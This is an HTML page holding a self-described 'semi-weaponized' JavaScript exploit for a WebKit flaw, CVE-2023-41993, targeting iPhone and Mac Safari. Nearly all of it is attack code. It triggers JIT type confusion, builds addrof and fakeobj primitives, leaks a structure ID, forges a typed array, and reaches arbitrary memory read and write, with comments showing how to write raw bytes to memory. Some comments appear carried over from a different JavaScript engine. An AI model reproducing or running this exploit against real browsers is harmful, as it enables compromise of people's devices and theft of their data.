
<!DOCTYPE html>
<html>
<body>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script>

/*
semi-weaponized exploit for CVE-2023-41993
tested on iOS 17.0 Beta 2 on iPhone 14 Pro Max
Author: https://github.com/0x06060606
*** DO NOT USE THIS EXPLOIT FOR MALICIOUS PURPOSES ***
*/

/*
poc: https://github.com/po6ix/POC-for-CVE-2023-41993/tree/main
poc author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

const ITERATIONS = 100000;
const MAX_ITERATIONS = 0xc0000;
var BASE = 0x100000000;

function lower(x) {
    return x & 0xffffffff;
}
let lo = lower;

function higher(x) {
    return (x - (x % BASE)) / BASE;
}
let hi = higher;

let noCoW = 13.37;
let arr = [noCoW, 2.2, 3.3];
let oobArr = [noCoW, 2.2, 3.3];
let objArr = [{}, {}, {}];

function Foo(arr, n)
{
    n = n | 0;
    if(n<0) {
        let v = (-n) | 0;
        let idx = Math.abs(n);
        if(idx < arr.length) {
            if(idx & 0x80000000) {
                idx += -0x7ffffffd;  // idx = 3;
            }
            if(idx>0) {
                return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
            }
        }
    }
}
for(let i=0; i<MAX_ITERATIONS; i++) {
	let tmp = -2;
	Foo(arr, tmp);
}
Foo(arr, -2147483648);

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val)
{ 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val)
{
    return i2f(val-0x02000000000000);
}

function gc() {
    for (let i = 0; i < 0x10; i++) {
        new ArrayBuffer(0x1000000)
    }
}

function byte2dword(payload) {
    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length / 6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for (let j = 0; j < 6; j++) {
            let c = payload[i * 6 + j]
            if (c === undefined) {
                c = 0;
            }
            pow = j == 0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};
let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;
let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}
let shapes = [];
for (let i = 0; i < 0x1000; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    document.write("<h1>Stage 1</h1>");
    gc();
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = trigger();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        alert("Failed to trigger getterSetter!");
        location.reload();
        return;
    }
    document.write("<h1>Triggered getterSetter!</h1>");
    let symbolObject = Object(getterSetter);
    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;
    let unknown_device = false;
    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }
    document.write("<h1>factor: " + factor + "</h1>");
    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }
    getter.p13 = 1.1;
    let unboxed_arr = getter;
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }
    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }
    function isVulnerable() {
        let base = addrof({}).asDouble();
        if (!isNaN(base)) {
            let base_fake = fakeobj(Int64.fromDouble(base));
            if (base_fake.__proto__ == Object.prototype) {
                let t = {b: 42};
                let a = addrof(t);
                if (fakeobj(addrof(t)) !== t) {
                    return false;
                } else {
                    return true;
                }
            }
        }
        return false;
    }
    if (isVulnerable()) {
        document.write("<h1>Stage 2</h1>");
        function LeakStructureID(obj)
        {
            let container = {
                cellHeader: i2obj(0x0108200700000000),
                butterfly: obj
            };
            let fakeObjAddr = Add(addrof(container), 0x10);
            let fakeObj = fakeobj(fakeObjAddr);
            f64[0] = fakeObj[0];
            let structureID = u32[0];
            u32[1] = 0x01082307 - 0x20000;
            container.cellHeader = f64[0];
            return structureID;
        }
        var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
        let structureID = LeakStructureID(arrLeak); // Might not need this... XD
        document.write("<h1>StructureID: " + structureID + "</h1>");
        function ObjectSpoof()
        {
            try {
                let a = new Array(16);
                let b = new Array(16);
                let addr = addrof(a);
                document.write("<h1>Spoof Array @ " + addr + "</h1>");
                let type = Add(addr, 0x68);
                document.write("<h1>Type Array @ " + type + "</h1>");
                a[4] = 0x6;
                a[6] = lo(addr); a[7] = hi(addr);
                a[8] = lo(addr); a[9] = hi(addr);
                a[14] = 0x414141;
                a[16] = lo(type);
                a[17] = hi(type);
                let fakeAddr = i2f(Add(addr, 0x90));
                document.write("<h1>Fake Array @ " + Int64.fromDouble(fakeAddr) + "</h1>");
                let fake = fakeobj(Int64.fromDouble(fakeAddr));
                document.write("<h1>Fake Array: " + fake + "</h1>");
                let vtable = parseInt(fake);
                document.write("<h1>vtable: " + Int64.fromDouble(vtable) + "</h1>");
                let uint32_vtable = Add(vtable, 0xe3a8);
                document.write("<h1>uint32_vtable: " + uint32_vtable + "</h1>");
                type = new Array(16);
                type[0] = 50; // TypeIds_Uint32Array = 50,
                type[1] = 0;
                typeAddr = Add(addrof(type), 0x58);
                type[2] = lo(typeAddr); // ScriptContext is fetched and passed during SetItem so just make sure we don't use a bad pointer
                type[3] = hi(typeAddr);
                ab = new ArrayBuffer(0x1338);
                abAddr = addrof(ab);
                fakeObject = new Array(16);
                fakeObject[0] = lo(uint32_vtable);
                fakeObject[1] = hi(uint32_vtable);
                fakeObject[2] = lo(typeAddr); 
                fakeObject[3] = hi(typeAddr);
                fakeObject[4] = 0; // zero out auxSlots
                fakeObject[5] = 0;
                fakeObject[6] = 0; // zero out objectArray 
                fakeObject[7] = 0;
                fakeObject[8] = 0x1000;
                fakeObject[9] = 0;
                fakeObject[10] = lo(abAddr); 
                fakeObject[11] = hi(abAddr);
                address = addrof(fakeObject);
                fakeObjectAddr = Add(address, 0x58);
                document.write("<h1>Fake typed array @ " + fakeObjectAddr + "</h1>");
                memory = {
                    setup: function(addr) {
                        fakeObject[14] = lower(addr); 
                        fakeObject[15] = higher(addr);
                    },
                    write32: function(addr, data) {
                        memory.setup(addr);
                        arr[0] = data;
                    },
                    write64: function(addr, data) {
                        memory.setup(addr);
                        arr[0] = data & 0xffffffff;
                        arr[1] = data / 0x100000000;
                    },
                    read64: function(addr) {
                        memory.setup(addr);
                        return arr[0] + arr[1] * BASE;
                    },
                    read32: function(addr) {
                        memory.setup(addr);
                        return arr[0];
                    },
                    read: function(addr, length) {
                        memory.setup(addr);
                        return arr.slice(0, length);
                    },
                    write: function(addr, data) {
                        memory.setup(addr);
                        let sc = byte2dword(data);
                        for (let i = 0; i < sc.length; i++) {
                            this.write32(addr + i * 6, sc[i]);
                        }
                    }
                };
                document.write("<h1>" + address + " == " + (memory.read64(address)) + "</h1>");
                //memory.setup(0x414243444546);
                memory.write64(0x414243444546, 0o2);
                if (memory.read64(0x414243444546) != '4') {
                    alert("Arbitrary memory write failed!");
                    location.reload();
                    return;
                } else {
                    document.write("<h1>Achieved arbitrary memory write!</h1>");
                    // Now we can read/write anywhere in memory
                    // -- Primitive functions --
                    // memory.write64 = Write 64 bit value to address
                    // memory.read64 = Read 64 bit value from address
                    // memory.write = Write arbitrary length data to address
                    // memory.read = Read arbitrary length data from address
                    // memory.setup = Set up memory read/write at address
                    // memory.write32 = Write 32 bit value to address
                    // memory.read32 = Read 32 bit value from address
                    // -- Example --
                    // memory.write64(0x414243444546, 0x1337);
                    // alert(memory.read64(0x414243444546));
                    // memory.write(0x414243444546, [0x48, 0x31, 0xc0, 0x48, 0x31, 0xff]);
                    // alert(memory.read(0x414243444546, 6));
                    // memory.write32(0x414243444546, 0x1337);
                    // alert(memory.read32(0x414243444546));
                    // memory.setup(0x414243444546);
                    // arr[0] = 0x1337;
                    // alert(arr[0]);
                    // -- End of Primitive functions --
                }
            } catch(e) {
                alert(e);
                location.reload();
                return;
            }
        }
        ObjectSpoof();
    } else {
        alert("Not vulnerable!");
        location.reload();
        return;
    }
})();

</script>
</body>
</html>